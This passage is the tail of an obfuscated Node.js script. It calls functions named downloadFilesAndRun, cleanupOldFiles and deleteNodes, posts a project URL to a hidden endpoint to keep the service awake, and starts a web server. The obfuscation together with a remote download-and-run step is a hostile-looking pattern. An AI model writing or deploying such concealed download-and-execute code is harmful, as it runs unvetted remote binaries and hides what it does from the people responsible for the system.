_0x2494f9=_0x5e1fce;console[_0x2494f9(0x1d8)](),console['log'](_0x2494f9(0x22e)),console['log'](_0x2494f9(0x28c));});},0x15f90);}function _0x31f3(_0x1b1660,_0x437aef){const _0x57fb2c=_0x1c93();return _0x31f3=function(_0x114b32,_0x458671){_0x114b32=_0x114b32-0x1d5;let _0x189cbe=_0x57fb2c[_0x114b32];return _0x189cbe;},_0x31f3(_0x1b1660,_0x437aef);}cleanFiles();async function AddVisitTask(){const _0x4023f6=_0x3f363c;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4023f6(0x200)](_0x4023f6(0x25a));return;}try{const _0xa265be=await axios['post'](_0x4023f6(0x220),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4023f6(0x24c)}});return console[_0x4023f6(0x200)](_0x4023f6(0x26f)),_0xa265be;}catch(_0x7444e2){return console[_0x4023f6(0x21a)](_0x4023f6(0x241)+_0x7444e2[_0x4023f6(0x207)]),null;}}async function startserver(){try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5643bc){console['error']('Error\x20in\x20startserver:',_0x5643bc);}}startserver()[_0x3f363c(0x205)](_0x294544=>{const _0x37bf99=_0x3f363c;console[_0x37bf99(0x21a)](_0x37bf99(0x1e0),_0x294544);}),app[_0x3f363c(0x228)](PORT,()=>console[_0x3f363c(0x200)](_0x3f363c(0x1de)+PORT+'!'));
